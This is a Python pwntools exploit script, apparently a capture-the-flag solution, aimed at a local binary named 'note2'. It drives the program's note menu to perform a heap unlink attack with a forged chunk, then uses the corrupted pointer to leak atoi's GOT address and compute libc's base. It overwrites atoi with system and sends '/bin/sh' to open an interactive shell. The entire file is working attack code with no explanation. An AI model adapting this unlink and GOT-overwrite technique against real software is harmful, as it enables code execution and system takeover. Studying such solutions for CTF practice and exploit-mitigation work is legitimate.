from pwn import *

p=process("./note2")
elf=ELF("./note2")
libc=p.libc
context.log_level = 'debug'

def add_note(size, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.sendline(content)


def show(idx):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(idx))


def edit_note(idx, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(idx))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def delete_note(idx):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(idx))

if __name__=="__main__":
    p.sendlineafter("Input your name:\n","aaaa")
    p.sendlineafter("Input your address:\n","bbb")
    ptr = 0x0000000000602120
    fakefd = ptr - 0x18
    fakebk = ptr - 0x10
    content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
    add_note(128, content)
    add_note(0, 'a' * 8)
    add_note(0x80, 'b' * 16)
    delete_note(1)
    content = 'a' * 16 + p64(0xa0) + p64(0x90)
    add_note(0, content)
    delete_note(2)
    atoi_got = elf.got['atoi']
    content = 'a' * 0x18 + p64(atoi_got)
    edit_note(0, 1, content)
    show(0)
    p.recvuntil('is ')
    atoi_addr = p.recvuntil('\n', drop=True)
    print atoi_addr
    atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
    print 'leak atoi addr: ' + hex(atoi_addr)
    atoi_offest = libc.symbols['atoi']
    libcbase = atoi_addr - atoi_offest
    system_offest = libc.symbols['system']
    system_addr = libcbase + system_offest
    print 'leak system addr: ', hex(system_addr)
    content = p64(system_addr)
    edit_note(0, 1, content)
    p.recvuntil('option--->>')
    p.sendline('/bin/sh')
    p.interactive()